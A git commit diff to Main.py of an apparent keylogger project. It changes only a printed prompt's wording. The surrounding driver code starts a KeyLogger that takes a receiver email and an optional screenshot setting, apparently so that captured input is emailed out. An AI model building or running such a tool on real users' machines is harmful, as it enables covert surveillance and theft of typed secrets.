a9acb36e1dfa9df542ff81932381223e51fdb921
Siddharth-Chandel <siddharthchandel2004@gmail.com>
2023-02-21 14:27:02 +0530

    updates

--- Main.py
+++ Main.py
@@ -1,5 +1,5 @@
 from keylogger.keylogger import KeyLogger
 logger = KeyLogger()
-print('Enter : ctrl+D ; to stop keylogger at the end of a program...')
+print('Enter : ctrl+D ; to stop keylogger at the end of the program...')
 logger.keylogger(receiver_email=input('Receiver email : '),
                  ss=input('Takes screenshot ? (yes/no) : '))
